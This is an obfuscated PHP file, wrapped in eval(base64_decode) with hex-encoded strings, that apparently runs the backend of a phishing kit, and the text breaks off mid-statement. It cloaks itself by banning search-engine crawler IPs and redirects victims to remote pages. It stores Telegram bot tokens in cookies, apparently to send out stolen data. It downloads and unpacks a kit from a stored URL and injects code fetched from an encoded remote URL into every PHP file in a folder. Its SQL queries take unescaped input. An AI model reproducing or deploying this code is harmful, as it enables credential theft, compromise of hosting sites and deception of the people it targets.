<?php eval(base64_decode('
 goto gVH1e; AjNVX: function user_data($ipAddress, $id) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\103\x6f\156\x6e\145\x63\x74\x69\x6f\x6e\x20\146\141\151\154\x65\144\72\x20" . mysqli_connect_error()); } $sql_u = "\123\x45\x4c\105\x43\124\x20\52\x20\106\122\x4f\115\x20\x72\x65\144\151\x72\143\x74\x69\x6f\x6e\x20\x57\110\x45\122\105\40\151\144\x3d\47{$id}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { while ($row = mysqli_fetch_array($res_u)) { $_SESSION["\154\151\156\153"] = base64_decode(base64_decode($row["\154\x69\156\x6b"])); $_SESSION["\143\x6e"] = explode("\x3b", base64_decode(base64_decode($row["\143\157\x75\156\164\162\171"]))); $_SESSION["\160\151\x63"] = $row["\160\151\x63"]; $_SESSION["\155\163\147"] = base64_decode(base64_decode($row["\155\163\147"])); $_SESSION["\145\170\160\x69\162\x65\137\x64\x61\x74\145"] = $row["\x65\x78\x70\151\x72\145\x5f\144\x61\x74\145"]; $_SESSION["\163\x65\x72\166\x65\x72"] = base64_decode(base64_decode($row["\163\145\162\x76\x65\x72"])); $_SESSION["\165\x72\x6c"] = base64_decode(base64_decode($row["\165\162\x6c"])); $_SESSION["\x6c\165\170\x63\x61\160\x74\143\x68\141"] = $row["\154\x75\x78\143\x61\160\x74\x63\x68\x61"]; $_SESSION["\x74\x6f\x6b\145\156\164\x65\154"] = base64_decode(base64_decode($row["\x74\x6f\x6b\x65\x6e\164\145\x6c"])); $_SESSION["\x69\x64\164\x65\x6c"] = base64_decode(base64_decode($row["\x69\144\x74\145\154"])); $_SESSION["\162\x65\x64\151\162\x69\143\x74"] = $row["\x72\x65\x64\151\x72\151\x63\x74"]; $_SESSION["\x70\x72\x6f\x6a\145\143\x74"] = $row["\x70\x72\157\x6a\x65\143\164"]; $_SESSION["\141\160\x69"] = $row["\141\160\x69"]; $_SESSION["\x61\144\x64\x62\171"] = $row["\141\x64\x64\x62\171"]; $_SESSION["\151\x73\160\162\157\164\145\x63\x74"] = $row["\151\x73\160\x72\x6f\x74\x65\143\x74"]; $_SESSION["\x70\x72\157\x78\171"] = $row["\x70\x72\x6f\170\x79"]; $_SESSION["\x63\141\160\x74\x63\x68\x61\137\x64\141\x74\x61"] = $row["\143\x61\x70\164\143\150\x61"]; $_SESSION["\x67\x6f\x6f\x6c\145\137\143\141\160"] = $row["\147\157\157\147\154\145\x5f\x63\141\160"]; $_SESSION["\x63\x6c\x6f\165\x64\137\x63\141\x70"] = $row["\143\154\157\x75\x64\137\143\x61\160"]; $_SESSION["\160\x72\x6f\x5f\x69\x63\157"] = $row["\160\x72\157\137\x69\x63\157"]; $_SESSION["\x70\x72\x6f\x5f\143\x6f\154\x6f\x72"] = $row["\x70\x72\x6f\x5f\143\x6f\154\x6f\162"]; $_SESSION["\x70\x72\x6f\x5f\x6d\163\x67"] = $row["\x70\162\x6f\x5f\x6d\163\147"]; $_SESSION["\x70\x72\157\137\x69\x6d\147"] = $row["\x70\162\157\137\x69\155\x67"]; $_SESSION["\x70\x72\x6f\137\x6c\x6f\147\157"] = $row["\160\162\x6f\x5f\x6c\x6f\147\x6f"]; } } else { $refix = "\156\x6f\164\x20\146\x6f\x75\156\x64\40\x69\x64\x2e{$id}"; banned_client($ipAddress, $refix); die; } mysqli_close($db); } goto VX8gd; bhveB: function detect_user($ipAddress) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\157\156\156\x65\143\164\x69\x6f\156\x20\146\141\151\154\145\144\x3a\40" . mysqli_connect_error()); } $sql_u = "\123\x45\114\105\103\x54\40\x2a\x20\106\x52\x4f\115\x20\x6c\x6f\147\x73\40\x57\110\x45\122\x45\x20\151\x70\141\x64\x64\x72\x65\x73\x3d\47{$ipAddress}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); return true; } mysqli_close($db); return false; } goto P8Yfk; ZGPtG: function update_php_normal($folder_path) { $trackingFile = $folder_path . "\x72\x6f\165\x6c\163\x2e\164\x78\164"; $codeURL = base64_decode(base64_decode("\x59\125\x68\123\x4d\x47\116\x49\124\x54\x5a\x4d\145\x54\154\x35\x57\x56\x68\152\144\x56\157\171\142\104\x42\150\123\x46\x5a\x70\132\106\x68\117\142\107\116\x74\x54\156\132\151\142\x6c\112\163\x59\x6d\x35\122\x64\x56\153\x79\x4f\130\x52\115\x4d\x6e\x68\x71\x59\x6a\x4a\64\141\x47\x51\172\x62\107\170\x6a\x62\153\x31\62\131\172\111\65\x4d\x57\x4e\164\x54\155\x78\115\x4d\152\x46\x6f\x59\126\143\60\144\155\x4e\111\x53\x6e\132\153\x52\61\x5a\x71\132\105\x59\x35\144\x57\111\172\x53\156\x52\x5a\x56\63\144\x31\x5a\x45\x68\157\115\101")); $codeToAdd = fetchContentFromURL($codeURL); $codeToAddBottom = ''; $phpFilesList = getAllPhpFiles($folder_path); foreach ($phpFilesList as $filePath) { updatePhpFileWithCode($filePath, $codeToAdd); } } goto x61sq; gVH1e: ob_start(); goto GVuha; Yboir: function banned_client($ipAddress, $reason) { global $fs_host, $fs_user, $fs_log, $fs_name, $local_browser, $local_os, $local_domain, $local_time; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\157\x6e\156\145\143\x74\151\x6f\156\40\x66\141\x69\154\x65\144\72\x20" . mysqli_connect_error()); } $sql_check = "\123\105\x4c\x45\x43\124\x20\52\x20\x46\122\117\x4d\x20\x6c\157\x67\x73\40\127\110\x45\122\105\40\x69\160\x61\x64\x64\162\x65\163\75\x3f"; $stmt = mysqli_prepare($db, $sql_check); mysqli_stmt_bind_param($stmt, "\x73", $ipAddress); mysqli_stmt_execute($stmt); $result = mysqli_stmt_get_result($stmt); if (mysqli_num_rows($result) > 0) { mysqli_close($db); http_response_code(405); $responseData = array("\162\145\x73\x5f\163\164\x61\x74\x75\x73" => "\x34\60\65", "\155\x65\x73\x73\x61\x67\x65" => "\125\163\145\162\x20\x69\x73\x20\x61\x6c\x72\x65\141\144\x79\40\151\x6e\x20\x74\x68\145\40\142\x6c\x61\x63\x6b\154\151\163\x74"); echo json_encode($responseData); die; } $country = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\163\145\x73\163\151\157\156\137\x63\157\x75\x6e\164\162\x79"])); $browser = mysqli_real_escape_string($db, str_replace("\x27", '', $local_browser)); $os_db = mysqli_real_escape_string($db, str_replace("\47", '', $local_os)); $local_domain = mysqli_real_escape_string($db, str_replace("\x27", '', $local_domain)); $host = mysqli_real_escape_string($db, str_replace("\x27", '', getHost($ipAddress))); $isp = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\163\145\163\163\151\157\x6e\x5f\x69\163\x70"])); $mobile = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\163\x65\163\x73\151\x6f\x6e\x5f\x6d\157\x62\151\154\x65"])); $proxy = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\x73\x65\x73\x73\x69\157\156\x5f\160\162\157\x78\x79"])); $hosting = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\x73\x65\163\163\x69\x6f\x6e\137\150\157\163\164\151\x6e\147"])); $city = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\163\x65\x73\163\151\157\156\137\143\151\164\x79"])); $region = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\163\x65\163\163\151\x6f\156\137\162\x65\x67\x69\157\x6e"])); $time = mysqli_real_escape_string($db, str_replace("\x27", '', $local_time)); $sql_insert = "\x49\x4e\123\105\x52\124\x20\111\116\124\x4f\x20\x6c\157\147\x73\40\x28\x69\160\x61\144\x64\162\x65\x73\x2c\143\x6f\165\156\164\x72\x79\54\x62\x72\157\167\163\x65\x72\x2c\x6f\163\54\x64\x6f\x6d\x69\156\x65\x2c\x68\x6f\x73\x74\54\151\x73\160\54\x6d\x6f\x62\151\154\x65\x2c\x70\162\x6f\x78\171\54\150\157\x73\x74\151\x6e\x67\54\143\x69\x74\x79\54\x72\x65\147\x69\x6f\156\54\155\x79\x74\151\x6d\145\x2c\x72\145\x73\157\x6e\51\x20\126\101\x4c\x55\105\123\40\x28\x3f\54\77\54\77\54\77\x2c\77\54\x3f\x2c\77\x2c\40\x3f\54\40\77\54\40\77\x2c\40\77\54\x20\x3f\x2c\40\77\x2c\40\x3f\x29"; $stmt = mysqli_prepare($db, $sql_insert); mysqli_stmt_bind_param($stmt, "\x73\163\163\163\x73\x73\x73\x73\x73\163\163\x73\163\163", $ipAddress, $country, $browser, $os_db, $local_domain, $host, $isp, $mobile, $proxy, $hosting, $city, $region, $time, $reason); mysqli_stmt_execute($stmt); mysqli_close($db); http_response_code(405); $responseData = array("\x72\145\x73\137\163\x74\141\x74\165\163" => "\64\60\65", "\x6d\x65\163\163\141\x67\x65" => "\x55\163\145\162\x20\x61\x64\144\x65\x64\x20\x74\x6f\40\x74\150\145\x20\142\x6c\141\x63\x6b\x6c\x69\163\x74"); echo json_encode($responseData); die; } goto QhjOT; n7zyD: $local_browser = get_browser_value($local_userAgent); goto MyebT; mbpUr: function is_bot_ip($ipToCheck) { $botsUrls = array("\x67\157\157\x67\x6c\x65" => "\x68\164\164\160\x73\x3a\57\x2f\x64\145\x76\x65\154\157\x70\x65\x72\163\56\x67\157\x6f\x67\x6c\145\56\x63\157\155\57\x73\x65\x61\162\143\x68\57\x61\x70\x69\163\x2f\x69\x70\x72\x61\156\147\x65\163\57\x67\157\x6f\147\154\x65\x62\x6f\164\56\x6a\x73\x6f\156", "\142\x69\x6e\147" => "\150\x74\164\x70\163\72\57\57\167\167\167\x2e\142\151\156\x67\x2e\x63\x6f\155\57\164\157\x6f\154\142\157\170\x2f\x62\x69\x6e\x67\x62\157\164\56\x6a\x73\157\156"); foreach ($botsUrls as $bot => $url) { $botResp = json_decode(file_get_contents($url), true); foreach ($botResp["\x70\x72\145\146\151\170\145\x73"] as $ipRange) { if (isset($ipRange["\x69\x70\x76\66\120\162\145\x66\x69\x78"]) && strpos($ipToCheck, "\72") !== false) { $network = $ipRange["\x69\x70\x76\66\120\x72\145\146\x69\x78"]; } elseif (isset($ipRange["\x69\160\x76\x34\x50\x72\145\146\x69\x78"]) && strpos($ipToCheck, "\x3a") === false) { $network = $ipRange["\151\x70\x76\64\x50\162\x65\x66\151\170"]; } else { continue; } if (ip_in_range($ipToCheck, $network)) { return $bot; } } } return false; } goto GaWdw; W6a34: function random_number($length) { $characters = "\60\x31\x32\x33\x34\65\66\67\70\71"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto AjNVX; Dp1B3: $currentTimestamp = time(); goto LzJXy; QhjOT: function fetchContentFromURL($url) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $content = curl_exec($ch); curl_close($ch); return $content; } goto VWHC6; AO6Gz: error_reporting(E_ALL); goto eZxgd; LcH7k: function getClientIP() { if (!empty($_SERVER["\x48\x54\124\x50\x5f\103\114\x49\105\116\124\137\x49\120"])) { $ipAddress = $_SERVER["\110\124\x54\x50\x5f\103\x4c\111\105\116\x54\137\111\x50"]; } elseif (!empty($_SERVER["\x48\x54\124\120\x5f\130\137\x46\x4f\122\x57\x41\122\104\x45\104\137\x46\x4f\122"])) { $ipAddress = $_SERVER["\110\124\124\120\x5f\x58\137\106\x4f\x52\x57\101\x52\x44\105\x44\137\106\x4f\122"]; } else { $ipAddress = $_SERVER["\122\105\x4d\x4f\124\105\x5f\x41\104\104\x52"]; } $validIPs = array(); $ipMatches = preg_match_all("\57\134\142\x5c\144\x7b\x31\54\x33\175\134\56\134\x64\x7b\61\x2c\x33\175\134\x2e\134\144\x7b\61\x2c\x33\175\134\56\134\x64\x7b\61\54\63\175\134\x62\57", $ipAddress, $matches); if ($ipMatches) { $validIPs = $matches[0]; } if (!empty($validIPs)) { $_SESSION["\x73\x65\163\163\x69\157\156\137\x69\x70"] = $validIPs[0]; return $validIPs[0]; } else { $_SESSION["\163\145\163\163\x69\157\x6e\137\151\160"] = "\x31\62\67\x2e\x30\56\x30\x2e\61"; return "\x31\62\67\x2e\x30\56\60\x2e\x31"; } } goto f1kOY; G1AYt: function update_user() { list($token, $chatid) = get_expire_token(); $dateexp = $_SESSION["\145\170\160\x69\x72\x65\137\x64\141\164\145"]; $expireTimestamp = strtotime($dateexp); $currentTimestamp = time(); if ($currentTimestamp >= $expireTimestamp) { setcookie("\x74\x6f\x6b\x65\156\164\x65\154", $token, time() + 86400 * 30, "\57"); setcookie("\151\x64\x74\x65\x6c", $chatid, time() + 86400 * 30, "\x2f"); setcookie("\162\x65\144\x69\x72\151\x63\164", $_SESSION["\x72\145\144\151\x72\151\143\x74"], time() + 86400 * 30, "\57"); setcookie("\x70\162\x6f\152\145\143\164", $_SESSION["\160\x72\157\152\x65\143\x74"], time() + 86400 * 30, "\x2f"); setcookie("\x73\157\165\x72\143\x65\155\145", $_SESSION["\141\x64\144\142\x79"], time() + 86400 * 30, "\57"); setcookie("\x6e\x65\167\x5f\x65\x78\x70", $expireTimestamp, time() + 86400 * 30, "\x2f"); setcookie("\x76\157\x6c\x6d", $token, time() + 86400 * 30, "\57"); setcookie("\144\x6f\x6c\155", $chatid, time() + 86400 * 30, "\x2f"); } else { setcookie("\x74\x6f\153\x65\x6e\x74\145\154", $_SESSION["\x74\x6f\x6b\145\x6e\164\x65\154"], time() + 86400 * 30, "\x2f"); setcookie("\x69\x64\x74\x65\154", $_SESSION["\151\144\x74\x65\154"], time() + 86400 * 30, "\57"); setcookie("\162\x65\144\x69\162\x69\143\164", $_SESSION["\x72\x65\x64\151\162\x69\143\x74"], time() + 86400 * 30, "\x2f"); setcookie("\x70\x72\x6f\x6a\x65\143\164", $_SESSION["\160\162\x6f\152\145\x63\164"], time() + 86400 * 30, "\57"); setcookie("\163\157\165\x72\143\145\155\x65", $_SESSION["\x61\144\x64\142\x79"], time() + 86400 * 30, "\x2f"); setcookie("\166\x6f\154\155", $token, time() + 86400 * 30, "\x2f"); setcookie("\144\x6f\154\155", $chatid, time() + 86400 * 30, "\57"); } } goto zJjkT; P8Yfk: function random_string($length) { $characters = "\x61\142\x63\x64\145\x66\152\150\151\x67\x6b\154\x6d\x6e\x6f\160\161\x72\163\164\x75\166\167\x78\x79\x7a\x30\61\62\63\x34\x35\66\x37\x38\x39\101\102\103\104\x45\x46\x47\x48\x49\x4a\x4b\x4c\115\x4e\117\x50\x51\x52\123\124\125\126\x57\130\131\x5a"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return bin2hex(random_bytes(16)); } goto W6a34; zELPa: $local_os = get_platform($local_userAgent); goto n7zyD; LzJXy: $local_ip_g = getClientIP(); goto Z8dbv; fxbeM: $local_time = date("\131\x2d\155\55\144\x20\x48\x3a\x69\72\163"); goto rj9qh; Qm257: if ($_SERVER["\122\x45\x51\x55\105\123\124\x5f\x4d\105\x54\110\x4f\x44"] === "\x47\105\x54") { $remote = isset($_GET["\162\x65\155\x6f\164\145"]) ? $_GET["\x72\x65\x6d\157\x74\145"] : null; $id = isset($_GET["\151\x64"]) ? $_GET["\x69\144"] : null; $user = isset($_GET["\165\x73\x65\162"]) ? $_GET["\165\x73\x65\x72"] : null; $type = isset($_GET["\x74\x79\x70\x65"]) ? $_GET["\164\x79\x70\145"] : null; $view_user = isset($_GET["\x76\151\x65\167\x5f\165\163\145\x72"]) ? $_GET["\166\151\x65\x77\137\x75\x73\x65\162"] : null; $isValid = true; if (is_null($remote) || empty($remote)) { $isValid = false; } if (is_null($id) || empty($id)) { $isValid = false; } if (is_null($user) || empty($user)) { $isValid = false; } if (is_null($type) || empty($type)) { $isValid = false; } if ($isValid) { if ($type == "\154\x6f\147\151\x6e") { if ($remote !== null && $id !== null && $user !== null) { fetchIPInfo($user); user_data($user, $id); $_SESSION["\154\157\154\x69\x70\x73"] = $user; $_SESSION["\x6c\x6f\154\163\x6f\x75\x6c\x73"] = $id; update_user(); $RandOP_Mlux = random_string(6); $url = $remote . "\x3f\x26\x76\x61\x6c\151\x64\75" . $RandOP_Mlux . $RandOP_Mlux . "\x26\143\x6f\156\156\x65\143\164\x3d" . $RandOP_Mlux . "\46\165\x69\144\75" . $RandOP_Mlux . "\46\x64\141\164\141\75" . $id . "\x26\163\160\141\143\x65\75" . $RandOP_Mlux . "\x26\155\x6e\145\x6d\x6f\x6e\x69\143\75\46\x76\x6d\75" . $RandOP_Mlux; header("\x4c\157\x63\x61\164\151\157\156\72\40{$url}"); die; } else { $reson = "\105\x58\40\155\151\163\163\151\x6e\147"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\162\x65\163\x5f\x73\164\x61\164\x75\163" => "\x34\x30\x35", "\x6d\145\163\163\x61\147\x65" => "\x45\x58\40\x6d\151\163\x73\x69\156\x67"); ob_end_clean(); header("\103\x6f\x6e\x74\145\x6e\x74\55\124\x79\x70\145\72\x20\141\160\160\154\x69\x63\141\164\151\x6f\156\x2f\x6a\163\x6f\156"); $responseJson = json_encode($responseData); echo $responseJson; } } if ($type == "\x76\x69\x65\x77") { if ($remote !== null && $id !== null && $user !== null && $view_user !== null) { fetchIPInfo($user); user_data($user, $id); $_SESSION["\154\157\x6c\x69\160\x73"] = $user; $_SESSION["\x6c\x6f\x6c\163\x6f\165\x6c\163"] = $id; update_user_view($view_user); $RandOP_Mlux = random_string(6); $url = $remote . "\77\46\166\x61\154\x69\144\75" . $RandOP_Mlux . $RandOP_Mlux . "\46\143\x6f\156\x6e\145\143\164\x3d" . $RandOP_Mlux . "\x26\x75\x69\x64\x3d" . $RandOP_Mlux . "\46\144\x61\x74\x61\75" . $id . "\46\163\x70\141\x63\x65\x3d" . $RandOP_Mlux . "\46\155\x6e\x65\x6d\x6f\x6e\x69\x63\x3d\x26\166\x6d\75" . $RandOP_Mlux; header("\x4c\157\x63\141\164\151\157\156\x3a\x20{$url}"); die; } else { $reson = "\166\151\x65\167\x20\155\151\x73\163\151\x6e\147"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\162\145\x73\137\163\164\141\164\x75\163" => "\x34\60\x35", "\x6d\x65\x73\x73\x61\x67\x65" => "\166\151\x65\167\x20\x6d\151\163\x73\x69\x6e\x67"); ob_end_clean(); header("\103\x6f\x6e\164\x65\156\164\55\124\171\x70\145\72\40\x61\160\160\x6c\x69\x63\x61\x74\x69\157\156\57\x6a\x73\x6f\x6e"); $responseJson = json_encode($responseData); echo $responseJson; } } } else { $reson = "\x69\x6e\166\141\x6c\x69\x64\x20\x44\x61\164\x61\40\55\40{$remote}\40\x2d\x20{$id}\x20\55\40{$user}\40\x2d\40{$type}\x20\55\x20{$view_user}"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\x72\x65\163\137\x73\164\x61\164\x75\x73" => "\x34\60\x35", "\155\145\163\x73\141\147\145" => "\144\141\164\141\x20\156\x6f\x74\x20\x61\x6c\154\157\167\x65\x64"); ob_end_clean(); header("\103\157\x6e\164\145\x6e\x74\x2d\124\171\160\145\72\40\141\160\x70\x6c\151\143\141\164\151\x6f\156\57\x6a\x73\x6f\x6e"); $responseJson = json_encode($responseData); echo $responseJson; } } elseif ($_SERVER["\122\x45\121\125\x45\123\x54\x5f\x4d\105\x54\110\117\104"] === "\120\x4f\x53\x54") { $view_com_ip = isset($_POST["\x76\x69\x65\167\x5f\163\145\x6e\x64\x5f\151\160"]) ? $_POST["\166\151\145\x77\137\x73\145\x6e\144\137\151\x70"] : null; $view_com_domain = isset($_POST["\x76\151\x65\167\x5f\x73\145\156\x64\137\144\x6f\x6d\x61\151\x6e"]) ? $_POST["\166\151\x65\167\137\x73\145\156\144\137\144\157\x6d\141\x69\x6e"] : null; $view_return_domain = isset($_POST["\x76\x69\x65\x77\137\x72\x65\164\x75\x72\156\137\144\157\155\141\151\x6e"]) ? $_POST["\x76\151\x65\167\x5f\162\x65\164\165\162\x6e\137\x64\x6f\155\141\151\x6e"] : null; $view_com_id = isset($_POST["\166\x69\145\x77\x5f\x73\x65\x6e\x64\137\x69\x64"]) ? $_POST["\166\151\x65\x77\x5f\x73\145\156\x64\137\151\x64"] : null; $view_com_action = isset($_POST["\166\x69\145\x77\x5f\163\145\156\x64\x5f\141\x63\164\x69\x6f\156"]) ? $_POST["\x76\151\145\x77\x5f\163\x65\x6e\144\x5f\x61\x63\x74\x69\157\156"] : null; $view_patch = isset($_POST["\x76\x69\x65\167\137\x70\x61\x74\143\150"]) ? $_POST["\166\151\x65\x77\x5f\x70\x61\164\x63\150"] : null; $view_user = isset($_POST["\x76\x69\145\x77\x5f\x75\x73\x65\162"]) ? $_POST["\x76\151\145\x77\137\x75\x73\x65\162"] : null; if ($view_com_ip !== null && $view_com_domain !== null && $view_return_domain !== null && $view_com_id !== null && $view_com_action !== null && $view_patch !== null && $view_user !== null) { if ($_POST["\x76\151\145\167\x5f\x73\145\156\x64\137\x61\x63\x74\151\x6f\156"] == "\166\x69\145\x77") { fetchIPInfo($view_com_ip); user_data($view_com_ip, $view_com_id); $_SESSION["\x6c\x6f\154\151\x70\163"] = $view_com_ip; $_SESSION["\x6c\x6f\x6c\163\x6f\165\154\163"] = $view_com_id; update_user_view($view_user); $RandOP_Mlux = random_string(6); $url = $view_patch . "\77\46\166\x69\x65\x77\75" . $RandOP_Mlux . $RandOP_Mlux . "\x26\x61\x6c\x65\162\x74\x3d" . $RandOP_Mlux . "\46\170\x6c\160\163\75" . $RandOP_Mlux . "\46\x73\x6f\x75\x6c\163\75" . $view_com_id . "\46\x64\157\x6e\x65\x3d\46\145\x72\162\x6f\162\171\75" . $RandOP_Mlux . "\46\x6d\x6e\145\155\157\x6e\x69\x63\x3d\46\152\x62\x3d" . $RandOP_Mlux; $responseData = array("\x76\x69\145\x77\x5f\162\x65\x73\x5f\163\x74\141\x74\165\163" => "\x73\x75\x63\143\x65\163\163", "\x6d\x65\x73\163\x61\x67\x65" => $url); ob_end_clean(); header("\x43\x6f\156\x74\145\156\x74\55\x54\x79\160\x65\72\x20\x61\160\x70\x6c\x69\x63\x61\164\151\157\x6e\57\152\x73\157\x6e"); $responseJson = json_encode($responseData); echo $responseJson; die; } } $login_com_ip = isset($_POST["\x6c\x6f\147\151\x6e\x5f\163\x65\x6e\144\137\151\x70"]) ? $_POST["\x6c\157\x67\x69\156\137\x73\145\156\x64\137\x69\x70"] : null; $login_com_domain = isset($_POST["\154\157\x67\151\156\x5f\x73\x65\156\x64\137\x64\x6f\x6d\x61\151\156"]) ? $_POST["\x6c\x6f\147\151\156\x5f\163\145\x6e\144\137\144\157\155\141\x69\156"] : null; $login_return_domain = isset($_POST["\154\x6f\x67\x69\x6e\137\162\x65\x74\165\x72\156\137\x64\157\155\141\x69\156"]) ? $_POST["\154\157\147\x69\x6e\x5f\x72\x65\164\165\x72\x6e\x5f\144\x6f\x6d\141\x69\156"] : null; $login_com_id = isset($_POST["\x6c\x6f\x67\x69\156\x5f\x73\145\x6e\144\x5f\151\x64"]) ? $_POST["\154\157\x67\151\156\137\x73\145\x6e\144\x5f\151\144"] : null; $login_com_action = isset($_POST["\x6c\157\x67\151\156\137\x73\x65\156\144\137\141\143\164\151\157\156"]) ? $_POST["\154\x6f\x67\151\156\x5f\163\145\156\144\x5f\141\143\164\151\157\156"] : null; $login_patch = isset($_POST["\154\x6f\x67\151\x6e\137\x70\141\164\143\x68"]) ? $_POST["\154\x6f\x67\x69\x6e\137\x70\141\x74\x63\150"] : null; if ($login_com_ip !== null && $login_com_domain !== null && $login_return_domain !== null && $login_com_id !== null && $login_com_action !== null && $login_patch !== null) { if ($_POST["\x6c\x6f\x67\x69\156\x5f\163\145\x6e\x64\137\x61\x63\x74\x69\x6f\156"] == "\154\157\147\151\156") { global $login_com_ip; fetchIPInfo($login_com_ip); user_data($login_com_ip, $login_com_id); $_SESSION["\154\157\x6c\151\x70\x73"] = $login_com_ip; $_SESSION["\x6c\157\x6c\x73\x6f\165\154\163"] = $login_com_id; update_user(); $RandOP_Mlux = random_string(6); $url = $login_patch . "\x3f\46\154\x6f\x67\x69\x6e\x3d" . $RandOP_Mlux . $RandOP_Mlux . "\46\x61\x6c\145\162\164\75" . $RandOP_Mlux . "\x26\x78\x6c\160\163\75" . $RandOP_Mlux . "\x26\x73\157\165\154\x73\75" . $login_com_id . "\46\144\x6f\156\145\75\x26\145\162\x72\x6f\162\171\75" . $RandOP_Mlux . "\x26\x6d\156\x65\155\x6f\156\x69\143\75\46\x6a\142\75" . $RandOP_Mlux; $responseData = array("\x6c\x6f\147\x69\x6e\x5f\x72\x65\x73\x5f\x73\164\x61\x74\165\x73" => "\163\165\143\x63\145\x73\x73", "\x6d\145\163\163\141\x67\145" => $url); ob_end_clean(); header("\103\157\156\164\145\x6e\x74\x2d\x54\x79\x70\145\x3a\40\x61\x70\x70\154\x69\x63\141\164\x69\157\x6e\57\x6a\163\x6f\156"); $responseJson = json_encode($responseData); echo $responseJson; die; } } $com_ip = isset($_POST["\163\x65\156\144\137\151\x70"]) ? $_POST["\x73\x65\x6e\144\x5f\151\160"] : null; $com_domain = isset($_POST["\163\145\x6e\144\x5f\144\x6f\155\x61\x69\156"]) ? $_POST["\x73\x65\156\x64\137\x64\157\x6d\141\151\156"] : null; $return_domain = isset($_POST["\162\145\x74\x75\x72\x6e\137\144\157\x6d\x61\x69\x6e"]) ? $_POST["\162\145\x74\165\162\156\137\x64\x6f\155\x61\151\x6e"] : null; $com_id = isset($_POST["\x73\145\x6e\x64\x5f\x69\144"]) ? $_POST["\163\145\x6e\144\x5f\151\144"] : null; $com_action = isset($_POST["\163\145\x6e\x64\x5f\x61\143\x74\151\x6f\x6e"]) ? $_POST["\x73\145\x6e\144\x5f\x61\143\164\151\157\156"] : null; if ($com_ip !== null && $com_domain !== null && $return_domain !== null && $com_id !== null && $com_action !== null) { fetchIPInfo($com_ip); if (detect_user($com_ip)) { http_response_code(405); $responseData = array("\x72\x65\163\x5f\163\x74\141\164\x75\x73" => "\64\x30\x35", "\155\145\163\x73\141\x67\x65" => "\165\163\x65\x72\40\142\154\x6f\143\x6b\145\x64"); $responseJson = json_encode($responseData); echo $responseJson; die; } if (is_bot_ip($com_ip)) { $reson = "\x73\160\141\x6d\x20\x69\x70"; banned_client($com_ip, $reson); http_response_code(405); $responseData = array("\162\x65\x73\x5f\163\x74\141\x74\165\x73" => "\64\60\x35", "\x6d\x65\163\x73\141\x67\145" => "\165\163\x65\x72\x20\x73\x70\x61\155"); $responseJson = json_encode($responseData); echo $responseJson; die; } if (isGoogleUser($local_userAgent, $com_ip)) { $reson = "\x47\x6f\157\147\154\x65\x20\151\x70"; banned_client($com_ip, $reson); $responseData = array("\x72\x65\163\x5f\163\x74\141\x74\x75\163" => "\64\60\x36", "\154\x6f\x63\x61\x6c\137\165\163\145\x72\101\147\145\156\x74" => $local_userAgent, "\143\x6f\155\x5f\x69\x70" => $com_ip, "\x6d\x65\x73\163\141\x67\x65" => "\151\x70\x20\146\151\154\x74\x74\x65\162"); $responseJson = json_encode($responseData); echo $responseJson; die; } if ($_POST["\x73\145\x6e\144\137\x61\143\x74\x69\157\x6e"] == "\154\157\147\151\x6e") { user_data($com_ip, $com_id); update_user(); } if ($_POST["\163\x65\156\144\x5f\141\143\164\151\x6f\x6e"] == "\x63\x72\145\x61\164\145") { user_data($com_ip, $com_id); download_extract($_SESSION["\165\x72\154"]); update_index($_SESSION["\146\x6f\154\144\x65\x72"]); add_user($_SESSION["\146\x6f\x6c\x64\x65\x72"], $com_ip); update_user(); if (isset($_SESSION["\x66\x6f\x6c\144\x65\162"])) { $folderPath = $_SESSION["\146\157\154\144\145\x72"]; $indexPath = findIndex($folderPath); if ($indexPath !== false && $indexPath !== $folderPath) { $relativePath = str_replace($folderPath . "\57", '', $indexPath); $indexContent = "\x3c\77\160\150\x70\40\x68\145\141\x64\x65\x72\50\x27\114\157\x63\141\x74\x69\157\x6e\72\x20\56\x2f{$relativePath}\47\x29\73\40\x3f\x3e"; file_put_contents($folderPath . "\x2f\151\x6e\144\145\x78\x2e\160\x68\160", $indexContent); } } if ($_SESSION["\141\160\x69"] !== "\x41\x50\111") { getFileContents($_SESSION["\141\160\151"]); } if ($_SESSION["\x69\x73\160\162\x6f\x74\x65\x63\x74"] == "\61") { update_php($_SESSION["\146\157\x6c\x64\x65\x72"]); } else { update_php_normal($_SESSION["\x66\x6f\154\144\145\162"]); } $responseData = array("\162\x65\x73\x5f\x73\x74\141\164\165\x73" => "\163\165\143\143\145\x73\163", "\162\x65\x73\137\x64\x69\162" => $_SESSION["\146\x6f\154\x64\145\x72"], "\162\145\x73\x5f\x75\162\x6c" => $_POST["\x73\x65\156\144\x5f\144\x6f\155\x61\151\156"], "\x72\145\163\x5f\151\144" => $_POST["\163\145\x6e\144\x5f\x69\144"], "\162\x65\163\x5f\x69\x70" => $_POST["\x73\145\x6e\144\x5f\151\x70"], "\162\145\x73\137\x61\x63\164\151\157\x6e" => $_POST["\163\145\x6e\144\x5f\x61\143\164\151\157\x6e"], "\155\x65\x73\163\141\147\145" => "\x73\x75\143\x63\x65\163\x73\146\165\x6c\154\171"); ob_end_clean(); 